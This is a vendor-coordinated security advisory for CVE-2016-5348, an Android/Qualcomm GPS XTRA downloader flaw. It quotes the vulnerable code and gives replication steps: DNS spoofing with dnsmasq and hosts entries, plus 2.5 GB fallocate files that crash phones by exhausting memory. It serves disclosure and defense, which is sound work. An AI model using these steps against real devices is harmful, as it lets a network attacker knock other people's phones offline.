@@ -1,0 +1,234 @@
+Original at:
+https://wwws.nightwatchcybersecurity.com/2016/10/04/advisory-cve-2016-5348-2/
+
+Summary
+
+Android devices can be crashed remotely forcing a halt and then a soft
+reboot by a MITM attacker manipulating assisted GPS/GNSS data provided
+by Qualcomm. This issue affects the open source code in AOSP and
+proprietary code in a Java XTRA downloader provided by Qualcomm. The
+Android issue was fixed by in the October 2016 Android bulletin.
+Additional patches have been issued by Qualcomm to the proprietary
+client in September of 2016. This issue may also affect other
+platforms that use Qualcomm GPS chipsets and consume these files but
+that has not been tested by us, and requires further research.
+
+Background – GPS and gpsOneXtra
+
+Most mobile devices today include ability to locate themselves on the
+Earth’s surface by using the Global Positioning System (GPS), a system
+originally developed and currently maintained by the US military.
+Similar systems developed and maintained by other countries exist as
+well including Russia’s GLONASS, Europe’s Galileo, and China’s Beidou.
+The GPS signals include an almanac which lists orbit and status
+information for each of the satellites in the GPS constellation. This
+allows the receivers to acquire the satellites quicker since the
+receiver would not need to search blindly for the location of each
+satellite. Similar functionality exists for other GNSS systems. In
+order to solve the problem of almanac acquisition, Qualcomm developed
+the gpsOneXtra system in 2007 (also known as IZat XTRA Assistance
+since 2013). This system provides ability to GPS receivers to download
+the almanac data over the Internet from Qualcomm-operated servers. The
+format of these XTRA files is proprietary but seems to contain current
+satellite location data plus estimated locations for the next 7 days,
+as well as additional information to improve signal acquisition. Most
+Qualcomm mobile chipsets and GPS chips include support for this
+technology. A related Qualcomm technology called IZat adds ability to
+use WiFi and cellular networks for locations in addition to GPS.
+
+Background – Android and gpsOneXtra Data Files
+
+During our network monitoring of traffic originating from an Android
+test device, we discovered that the device makes periodic calls to the
+Qualcomm servers to retrieve gpsOneXtra assistance files. These
+requests were performed almost every time the device connected to a
+WiFi network. As discovered by our research and confirmed by the
+Android source code, the following URLs were used:
+
+http://xtra1.gpsonextra.net/xtra.bin
+http://xtra2.gpsonextra.net/xtra.bin
+http://xtra3.gpsonextra.net/xtra.bin
+
+http://xtrapath1.izatcloud.net/xtra2.bin
+http://xtrapath2.izatcloud.net/xtra2.bin
+http://xtrapath3.izatcloud.net/xtra2.bin
+
+WHOIS record show that both domains – gpsonextra.net and izatcloud.net
+are owned by Qualcomm. Further inspection of those URLs indicate that
+both domains are being hosted and served from Amazon’s Cloudfront CDN
+service (with the exception of xtra1.gpsonextra.net which is being
+served directly by Qualcomm). On the Android platform, our inspection
+of the Android source code shows that the file is requested by an
+OS-level Java process (GpsXtraDownloader.java), which passes the data
+to a C++ JNI class
+(com_android_server_location_GnssLocationProvider.cpp), which then
+injects the files into the Qualcomm modem or firmware. We have not
+inspected other platforms in detail, but suspect that a similar
+process is used. Our testing was performed on Android v6.0, patch
+level of January 2016, on a Motorola Moto G (2nd gen) GSM phone, and
+confirmed on a Nexus 6P running Android v6.01, with May 2016 security
+patches. Qualcomm has additionally performed testing on their
+proprietary Java XTRA downloader client confirming this vulnerability.
+
+Vulnerability Details
+
+Android platform downloads XTRA data files automatically when
+connecting to a new network. This originates from a Java class
+(GpsXtraDownloader.java), which then passes the file to a C++/JNI
+class (com_android_server_location_GnssLocationProvider.cpp) and then
+injects it into the Qualcomm modem.
+
+The vulnerability is that both the Java and the C++ code do not check
+how large the data file actually is. If a file is served that is
+larger than the memory available on the device, this results in all
+memory being exhausted and the phone halting and then soft rebooting.
+The soft reboot was sufficient to recover from the crash and no data
+was lost. While we have not been able to achieve remote code execution
+in either the Qualcomm modem or in the Android OS, this code path can
+potentially be exploited for such attacks and would require more
+research.
+
+To attack, an MITM attacker located anywhere on the network between
+the phone being attacked and Qualcomm’s servers can initiate this
+attack by intercepting the legitimate requests from the phone, and
+substituting their own, larger files. Because the default Chrome
+browser on Android reveals the model and build of the phone (as we
+have written about earlier), it would be possible to derive the
+maximum memory size from that information and deliver the
+appropriately sized attack file. Possible attackers can be hostile
+hotspots, hacked routers, or anywhere along the backbone. This is
+somewhat mitigated by the fact that the attack file would need to be
+as large as the memory on the phone.
+
+The vulnerable code resides here – (GpsXtraDownloader.java, lines 120-127):
+
+connection.connect()
+int statusCode = connection.getResponseCode();
+if (statusCode != HttpURLConnection.HTTP_OK) {
+if (DEBUG) Log.d(TAG, “HTTP error downloading gps XTRA: “ + statusCode);
+return null;
+}
+return Streams.readFully(connection.getInputStream());
+
+Specifically, the affected code is using Streams.readFully to read the
+entire file into memory without any kind of checks on how big the file
+actually is.
+
+Additional vulnerable code is also in the C++ layer –
+(com_android_server_location_GnssLocationProvider.cpp, lines 856-858):
+
+jbyte* bytes = (jbyte *)env->GetPrimitiveArrayCritical(data, 0);
+sGpsXtraInterface->inject_xtra_data((char *)bytes, length);
+env->ReleasePrimitiveArrayCritical(data, bytes, JNI_ABORT);
+
+Once again, no size checking is done. We were able to consistently
+crash several different Android phones via a local WiFi network with
+the following error message:
+
+java.lang.OutOfMemoryError: Failed to allocate a 478173740 byte
+allocation with 16777216 free bytes and 252MB until OOM
+at java.io.ByteArrayOutputStream.expand(ByteArrayOutputStream.java:91)
+
+(It should be noted that we were not able to consistently and reliable
+achieve a crash in the C++/JNI layer or the Qualcomm modem itself)
+
+Steps To Replicate (on Ubuntu 16.04)
+1. Install DNSMASQ:
+sudo apt-get install dnsmasq
+
+2. Install NGINX:
+sudo apt-get install nginx
+
+3. Modify the /etc/hosts file to add the following entries to map to
+the IP of the local computer (varies by vendor of the phone):
+192.168.1.x xtra1.gpsonextra.net
+192.168.1.x xtra2.gpsonextra.net
+192.168.1.x xtra3.gpsonextra.net
+192.168.1.x xtrapath1.izatcloud.net
+192.168.1.x xtrapath2.izatcloud.net
+192.168.1.x xtrapath3.izatcloud.net
+
+4. Configure /etc/dnsmasq.conf file to listed on the IP:
+listen-address=192.168.1.x
+
+5. Restart DNSMASQ:
+sudo /etc/init.d/dnsmasq restart
+
+6. Use fallocate to create the bin files in “/var/www/html/”
+sudo fallocate -s 2.5G xtra.bin
+sudo fallocate -s 2.5G xtra2.bin
+sudo fallocate -s 2.5G xtra3.bin
+
+7. Modify the settings on the Android test phone to static, set DNS to
+point to “192.168.1.x”. AT THIS POINT – Android will resolve DNS
+against the local computer, and serve the GPS files from it.
+
+To trigger the GPS download, disable WiFi and enable Wifi, or
+enable/disable Airplane mode. Once the phone starts downloading the
+files, the screen will go black and it will reboot.
+
+PLEASE NOTE: on some models, the XTRA file is cached and not retrieved
+on every network connect. For those models, you may need to reboot the
+phone and/or follow the injection commands as described here. You can
+also use an app like GPS Status and ToolboxGPS Status and Toolbox.
+
+The fix would be to check for file sizes in both Java and native C++ code.
+
+Mitigation Steps
+
+For the Android platform, users should apply the October 2016 Android
+security bulletin and any patches provided by Qualcomm. Please note
+that as per Qualcomm, the patches for this bug only include fixes to
+the Android Open Source Project (AOSP) and the Qualcomm Java XTRA
+downloader clients. Apple and Microsoft have indicated to us via email
+that GPS-capable devices manufactured by them including iPad, iPhones,
+etc. and Microsoft Surface and Windows Phone devices are not affected
+by this bug. Blackberry devices powered by Android are affected but
+the Blackberry 10 platform is not affected by this bug. For other
+platforms, vendors should follow guidance provided by Qualcomm
+directly via an OEM bulletin.
+
+Bounty Information
+
+This bug has fulfilled the requirements for Google’s Android Security
+Rewards and a bounty has been paid.
+
+References
+
+Android security bulletin: October 2016
+CERT/CC tracking: VR-179
+CVE-ID: CVE-2016-5348
+Google: Android bug # 213747 / AndroidID-29555864
+
+CVE Information
+
+As provided by Qualcomm:
+
+CVE: CVE-2016-5348
+Access Vector: Network
+Security Risk: High
+Vulnerability: CWE-400: Uncontrolled Resource Consumption (‘Resource
+Exhaustion’)
+Description: When downloading a very large assistance data file, the
+client may crash due to out of memory error.
+Change summary:
+
+check download size ContentLength before downloading data
+catch OOM exception
+
+Credits
+
+We would like to thank CERT/CC for helping to coordinate this process,
+and all of the vendors involved for helpful comments and a quick
+turnaround. This bug was discovered by Yakov Shafranovich, and the
+advisory was also written by Yakov Shafranovich.
+
+Timeline
+
+201606-20: Android bug report filed with Google
+2016-06-21: Android bug confirmed
+2016-06-21: Bug also reported to Qualcomm and CERT.
+2016-09-14: Coordination with Qualcomm on public disclosure
+2016-09-15: Coordination with Google on public disclosure
+2016-10-03: Android security bulletin released with fix
+2016-10-04: Public disclosure
